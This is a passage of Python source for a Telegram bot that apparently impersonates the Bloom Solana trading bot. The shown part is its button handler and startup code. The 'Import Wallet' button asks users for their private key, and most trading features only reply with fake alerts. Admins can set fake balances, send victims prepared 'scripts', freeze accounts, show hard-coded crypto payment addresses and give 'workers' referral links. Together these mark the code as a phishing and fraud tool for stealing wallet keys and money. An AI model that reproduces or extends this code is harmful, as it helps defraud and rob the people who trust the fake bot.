            usd_bal = user_usd_balances.get(target_user_id, 0)
            await query.edit_message_text(
                f"✅ Balance {action_text} for user {target_user_id}.\nNew balances: {sol_bal:.2f} SOL + ${usd_bal:.2f} USD"
            )

        elif action == "message" and user_id in admin_states and "pending_message" in admin_states[user_id]:
            pending = admin_states[user_id]["pending_message"]
            message_to_send = pending["message"]

            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=message_to_send,
                    parse_mode=ParseMode.HTML
                )

                # Clear pending operation
                del admin_states[user_id]["pending_message"]

                await query.edit_message_text(f"✅ Message sent successfully to user {target_user_id}!")

            except Exception as e:
                await query.edit_message_text(f"❌ Failed to send message to user {target_user_id}: {str(e)}")

        elif action == "script" and user_id in admin_states and "pending_script" in admin_states[user_id]:
            pending = admin_states[user_id]["pending_script"]
            script_message = pending["message"]

            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=script_message,
                    parse_mode=ParseMode.HTML
                )

                # Clear pending operation
                del admin_states[user_id]["pending_script"]

                await query.edit_message_text(f"✅ Script sent successfully to user {target_user_id}!")

            except Exception as e:
                await query.edit_message_text(f"❌ Failed to send script to user {target_user_id}: {str(e)}")

        return

    # Handle decline buttons (only for owners)
    if user_id in [OWNER_ID, SECOND_OWNER_ID] and data.startswith("decline_"):
        parts = data.split("_", 2)
        action = parts[1]

        if action == "balance":
            # Clear pending operation and ask for balance input again
            if user_id in admin_states and "pending_balance" in admin_states[user_id]:
                del admin_states[user_id]["pending_balance"]

            # Initialize admin_states if it doesn't exist
            if user_id not in admin_states:
                admin_states[user_id] = {}
            admin_states[user_id]["awaiting_balance_input"] = True
            await query.edit_message_text(
                "💰 <b>Add Balance</b>\n\nPlease enter the user ID, SOL amount, and USD amount:\n\n<code>user_id sol_amount usd_amount</code>\n\nExample: <code>123456789 5.5 1000.0</code>\nUse <code>0 0</code> to reset balance.",
                parse_mode=ParseMode.HTML
            )

        elif action == "message":
            # Clear pending operation and ask for message input again
            if user_id in admin_states and "pending_message" in admin_states[user_id]:
                del admin_states[user_id]["pending_message"]

            # Initialize admin_states if it doesn't exist
            if user_id not in admin_states:
                admin_states[user_id] = {}
            admin_states[user_id]["awaiting_message_input"] = True
            await query.edit_message_text(
                "💬 <b>Message User</b>\n\nPlease enter the user ID and message:\n\n<code>user_id message</code>\n\nExample: <code>123456789 Hello, this is a custom message!</code>",
                parse_mode=ParseMode.HTML
            )

        elif action == "script":
            # Clear pending operation and go back to script selection
            if user_id in admin_states and "pending_script" in admin_states[user_id]:
                del admin_states[user_id]["pending_script"]

            await query.edit_message_text(
                "📝 <b>Saved Scripts</b>\n\nSelect a script to send:",
                parse_mode=ParseMode.HTML,
                reply_markup=saved_scripts_keyboard()
            )

        return

    # Popup alerts for specific buttons that need wallet import or other alerts
    alert_buttons = [
        "popup_import_wallet",  # Min Value and Sell position buttons
        "popup_pro_accounts",   # Pro accounts button
        "popup_create_task",    # Create task button
        "popup_add_new_config", # Copy trade: Add new config
        "popup_pause_all",      # Copy trade: Pause all
        "popup_start_all",      # Copy trade: Start all
        "popup_set_address",    # Set address button
        "withdraw_50",          # 50% withdraw button
        "withdraw_100",         # 100% withdraw button
        "withdraw_x",           # X SOL withdraw button
        "settings_fee",         # Fee button
        "settings_slippage"     # Slippage button
    ]

    if data in alert_buttons:
        await query.answer(
            text="You currently don't have any wallets imported. Please import one to do this.",
            show_alert=True
        )
        return

    # Acknowledge the callback to remove the loading animation for other buttons
    await query.answer()

    # Handle close button
    if data == "close":
        await query.message.delete()
        return

    # Handle refresh button: edit message to update timestamp
    if data == "refresh":
        # For simplicity, refresh main menu or current menu text
        # Here we refresh main menu for demonstration, extend per submenu as needed
        await query.edit_message_text(
            text=get_repeat_start_message(user_id),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=main_menu_keyboard(),
        )
        return

    # Go back to main menu
    if data == "main_menu":
        await query.edit_message_text(
            text=get_repeat_start_message(user_id),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=main_menu_keyboard(),
        )
        return

    # Admin panel operations (only for owners)
    if user_id in [OWNER_ID, SECOND_OWNER_ID]:
        if data == "admin_panel":
            text = (
                "🔧 <b>Admin Panel</b>\n\n"
                "Welcome to the administrative control panel.\n"
                "Select an option below:\n\n"
                f"🕒 Accessed at: {current_time()}"
            )
            await query.edit_message_text(
                text=text,
                parse_mode=ParseMode.HTML,
                reply_markup=panel_keyboard(),
            )
            return

        elif data == "admin_add_balance":
            # Initialize admin state for this user
            if user_id not in admin_states:
                admin_states[user_id] = {}
            admin_states[user_id]["awaiting_balance_input"] = True

            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text="💰 <b>Add Balance</b>\n\nPlease enter the user ID, SOL amount, and USD amount:\n\n<code>user_id sol_amount usd_amount</code>\n\nExample: <code>123456789 5.5 1000.0</code>\nUse <code>0 0</code> to reset balance.",
                parse_mode=ParseMode.HTML
            )
            return

        elif data == "admin_message_user":
            # Initialize admin state for this user
            if user_id not in admin_states:
                admin_states[user_id] = {}
            admin_states[user_id]["awaiting_message_input"] = True

            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text="💬 <b>Message User</b>\n\nPlease enter the user ID and message:\n\n<code>user_id message</code>\n\nExample: <code>123456789 Hello, this is a custom message!</code>",
                parse_mode=ParseMode.HTML
            )
            return

        elif data == "admin_saved_scripts":
            await query.edit_message_text(
                text="📝 <b>Saved Scripts</b>\n\nSelect a script to send:",
                parse_mode=ParseMode.HTML,
                reply_markup=saved_scripts_keyboard()
            )
            return

        elif data.startswith("script_"):
            script_key = data[7:]  # Remove "script_" prefix
            if script_key in SAVED_SCRIPTS:
                # Initialize admin state for this user
                if user_id not in admin_states:
                    admin_states[user_id] = {}
                admin_states[user_id]["awaiting_script_user_id"] = True
                admin_states[user_id]["selected_script"] = script_key

                script_preview = SAVED_SCRIPTS[script_key][:100] + "..." if len(SAVED_SCRIPTS[script_key]) > 100 else SAVED_SCRIPTS[script_key]

                await context.bot.send_message(
                    chat_id=query.message.chat_id,
                    text=f"📝 <b>{script_key.replace('_', ' ').title()}</b>\n\n<b>Preview:</b>\n{script_preview}\n\nPlease enter the user ID to send this script to:",
                    parse_mode=ParseMode.HTML
                )
            return

        elif data == "admin_freeze_user":
            # Initialize admin state for this user
            if user_id not in admin_states:
                admin_states[user_id] = {}
            admin_states[user_id]["awaiting_freeze_user_id"] = True

            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text="🔒 <b>Freeze User</b>\n\nPlease enter the user ID to freeze:",
                parse_mode=ParseMode.HTML
            )
            return

        elif data == "admin_unfreeze_user":
            # Initialize admin state for this user
            if user_id not in admin_states:
                admin_states[user_id] = {}
            admin_states[user_id]["awaiting_unfreeze_user_id"] = True

            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text="🔓 <b>Unfreeze User</b>\n\nPlease enter the user ID to unfreeze:",
                parse_mode=ParseMode.HTML
            )
            return

    # Positions submenu
    if data == "positions":
        text = (
            "🌸 Bloom Positions\n\n"
            "No open positions yet!\n"
            "Start your trading journey by pasting a contract address in chat.\n\n"
            f"🕒 Last updated: {current_time()}"
        )
        await query.edit_message_text(
            text=text,
            reply_markup=positions_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # LP Sniper submenu
    if data == "lp_sniper":
        text = (
            "🌸 Bloom Sniper\n\n"
            "🧐 No active sniper tasks!\n\n"
            "📖 Learn More!\n\n"
            f"🕒 Last updated: {current_time()}"
        )
        await query.edit_message_text(
            text=text,
            reply_markup=lp_sniper_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Copy Trade submenu
    if data == "copy_trade":
        text = (
            "🌸 Bloom Copy Trade\n\n"
            "💡 Copy the best traders with Bloom!\n\n"
            "Copy Wallet:\n"
            f"→ W1: <code>{WALLET_ADDRESS}</code>\n\n"
            "🟢 Copy trade setup is active\n"
            "🔴 Copy trade setup is inactive\n\n"
            "⏱️ Please wait 10 seconds after each change for it to take effect.\n\n"
            "⚠️ Changing your copy wallet? Remember to remake your tasks to use the new wallet for future transactions.\n\n"
            f"🕒 Last updated: {current_time()}"
        )
        await query.edit_message_text(
            text=text,
            reply_markup=copy_trade_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # AFK Mode submenu (same as Copy Trade)
    if data == "afk_mode":
        text = (
            "🌸 Bloom AFK\n\n"
            "💡 Run your bot while you are away!\n\n"
            "AFK Wallet:\n"
            f"→ W1: <code>{WALLET_ADDRESS}</code>\n\n"
            "🟢 AFK mode is active\n"
            "🔴 AFK mode is inactive\n\n"
            "⏱️ Please wait 10 seconds after each change for it to take effect.\n\n"
            "⚠️ Changing your Default wallet? Remember to remake your tasks to use the new wallet for future transactions.\n\n"
            f"🕒 Last updated: {current_time()}"
        )
        await query.edit_message_text(
            text=text,
            reply_markup=afk_mode_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Limit Orders submenu
    if data == "limit_orders":
        text = (
            "🌸 Bloom Orders\n\n"
            "🧐 No active limit orders!\n\n"
            "Create a limit order from the token page.\n\n"
            f"🕒 Last updated: {current_time()}"
        )
        await query.edit_message_text(
            text=text,
            reply_markup=limit_orders_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Referrals submenu
    if data == "referrals":
        text = (
            "🌸 Bloom Referral Program\n\n"
            "Your Referral Code:\n"
            "🔗 ref_0EW9TYD0C\n\n"
            "Your Payout Address:\n"
            "PLACEHOLDER\n\n"
            "📈 Referrals Volume:\n\n"
            "• Level 1: 0 Users / 0 SOL\n"
            "• Level 2: 0 Users / 0 SOL\n"
            "• Level 3: 0 Users / 0 SOL\n"
            "• Referred Trades: 0\n\n"
            "📊 Rewards Overview:\n\n"
            "• Total Unclaimed: 0 SOL\n"
            "• Total Claimed: 0 SOL\n"
            "• Lifetime Earnings: 0 SOL\n"
            "• Last distribution: 2025-02-16 12:19:06\n\n"
            "📖 Learn More!\n\n"
            f"🕒 Last updated: {current_time()}"
        )
        await query.edit_message_text(
            text=text,
            reply_markup=referrals_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Withdraw submenu
    if data == "withdrawal":
        text = (
            "🌸 Withdraw Solana\n\n"
            "Balance: 0 SOL\n\n"
            "Current withdrawal address:\n\n"
            "🔧 Last address edit: -\n\n"
            f"🕒 Last updated: {current_time()}"
        )
        await query.edit_message_text(
            text=text,
            reply_markup=withdraw_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Settings submenu
    if data == "settings":
        text = (
            "🌸 Bloom Settings\n\n"
            "🟢 : The feature/mode is turned ON\n"
            "🔴 : The feature/mode is turned OFF\n\n"
            "📖 Learn More!\n\n"
            f"🕒 Last updated: {current_time()}"
        )
        await query.edit_message_text(
            text=text,
            reply_markup=settings_keyboard(user_id),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Handle continue button from first one-time message
    if data == "continue":
        if user_id not in user_data:
            user_data[user_id] = {"first_one_off_sent": False, "second_one_off_sent": False}

        if not user_data[user_id]["second_one_off_sent"]:
            await query.edit_message_text(
                text=get_second_one_off_message(),
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=start_trading_keyboard(),
            )
            user_data[user_id]["second_one_off_sent"] = True
        return

    # Handle "start_trading" button after wallet creation
    if data == "start_trading":
        await query.edit_message_text(
            text=get_repeat_start_message(user_id),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=main_menu_keyboard(),
        )
        return

    # Handle Wallets settings
    if data == "settings_wallets":
        text = (
            "🌸 Wallets Settings\n\n"
            "Manage all your wallets with ease.\n\n"
            "📖 <a href='https://tos.bloombot.app/'>Learn More!</a>\n\n"
            f"🕒 Last updated: {current_time()}"
        )
        await query.edit_message_text(
            text=text,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🟢 W1 • 0 SOL", callback_data="view_wallet")],
                [InlineKeyboardButton("🔑 Import Wallet", callback_data="import_wallet")],
                [InlineKeyboardButton("⬅️ Back", callback_data="settings"),
                 InlineKeyboardButton("❌ Close", callback_data="close")]
            ]),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Handle Import Wallet
    if data == "import_wallet":
        # Set user state to expect private key input
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["awaiting_private_key"] = True

        # Send a new message below the wallet settings page without inline buttons
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="Please enter your private key:",
            parse_mode=ParseMode.HTML,
        )
        return

    # Handle toggle buttons for settings
    if data in ["settings_expert_mode", "settings_degen_mode", "settings_mev_protection"]:
        # Initialize user settings if not exists
        if user_id not in settings_states:
            settings_states[user_id] = {
                "expert_mode": False,
                "degen_mode": False,
                "mev_protection": False
            }

        # Toggle the appropriate setting
        if data == "settings_expert_mode":
            settings_states[user_id]["expert_mode"] = not settings_states[user_id]["expert_mode"]
        elif data == "settings_degen_mode":
            settings_states[user_id]["degen_mode"] = not settings_states[user_id]["degen_mode"]
        elif data == "settings_mev_protection":
            settings_states[user_id]["mev_protection"] = not settings_states[user_id]["mev_protection"]

        # Update the settings menu with new states
        text = (
            "🌸 Bloom Settings\n\n"
            "🟢 : The feature/mode is turned ON\n"
            "🔴 : The feature/mode is turned OFF\n\n"
            "📖 Learn More!\n\n"
            f"🕒 Last updated: {current_time()}"
        )
        await query.edit_message_text(
            text=text,
            reply_markup=settings_keyboard(user_id),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Handle Payment Addresses (for owners)
    if data == "show_payment_addresses":
        if user_id in [OWNER_ID, SECOND_OWNER_ID]:
            text = (
                "💰 <b>Payment Addresses</b>\n\n"
                "Please send payments to one of the following addresses:\n\n"
                "🔹 <b>Solana Address</b> (Click to copy)\n"
                "<code>7vY3pg1RwmLzNkZyQ47iEEqJ5j5WreY45ypPAkaaEdQe</code>\n\n"
                "🔹 <b>Ethereum Address</b> (Click to Copy)\n"
                "<code>0xaF688295e1F0C6c62140603B4EBACBB9ef00Cf61</code>\n\n"
                "📞 <b>Support Account:</b> @Opimet"
            )
            await query.edit_message_text(
                text=text,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("❌ Close", callback_data="close")]
                ]),
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
        return

    # Handle Current Workers (only for owners)
    if data == "current_workers":
        if user_id in [OWNER_ID, SECOND_OWNER_ID]:
            # Load workers data to count workers
            try:
                with open('Workers.json', 'r') as f:
                    workers_data = json.load(f)
            except FileNotFoundError:
                workers_data = {"workers": {}, "referrals": {}}
            except json.JSONDecodeError:
                workers_data = {"workers": {}, "referrals": {}}

            workers = workers_data.get("workers", {})
            worker_count = len(workers)
            
            text = (
                "👥 <b>Workers Panel</b>\n\n"
                f"Total Workers: {worker_count}\n\n"
                f"🕒 Last updated: {current_time()}"
            )
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Close", callback_data="close")]
            ])

            await query.edit_message_text(
                text=text,
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard,
                disable_web_page_preview=True,
            )
        return

    # Handle Worker Support
    if data == "worker_support":
        # Create inline button that opens Telegram link
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📞 Contact Support", url="https://t.me/Opimet")],
            [InlineKeyboardButton("❌ Close", callback_data="close")]
        ])
        
        text = (
            "🆘 <b>Support</b>\n\n"
            "For assistance or any questions, please contact our support team.\n\n"
            "Click the button below to open a direct chat with support."
        )
        
        await query.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True,
        )
        return

    # Handle Your Link
    if data == "your_link":
        # Create custom link with user's ID
        custom_link = f"https://t.me/SolanaBloomCryptoBot?start=worker_{user_id}"
        
        text = (
            "🔗 <b>Your Custom Link</b>\n\n"
            "Here is your personal worker link:\n\n"
            f"<code>{custom_link}</code>\n\n"
            "Click to copy the link above."
        )
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Close", callback_data="close")]
        ])
        
        await query.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True,
        )
        return

    # Add handlers for other buttons here as needed...

    # Default fallback - send main menu
    await query.edit_message_text(
        text=get_repeat_start_message(user_id),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=main_menu_keyboard(),
    )


def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("panel", panel))
    app.add_handler(CommandHandler("support", support))
    app.add_handler(CommandHandler("worker", worker))
    app.add_handler(CommandHandler("positions", positions_command))
    app.add_handler(CommandHandler("sniper", sniper_command))
    app.add_handler(CommandHandler("copy", copy_command))
    app.add_handler(CommandHandler("afk", afk_command))
    app.add_handler(CommandHandler("orders", orders_command))
    app.add_handler(CommandHandler("referrals", referrals_command))
    app.add_handler(CommandHandler("withdraw", withdraw_command))
    app.add_handler(CommandHandler("settings", settings_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    print("Bot started...")
    app.run_polling()


if __name__ == "__main__":
    main()
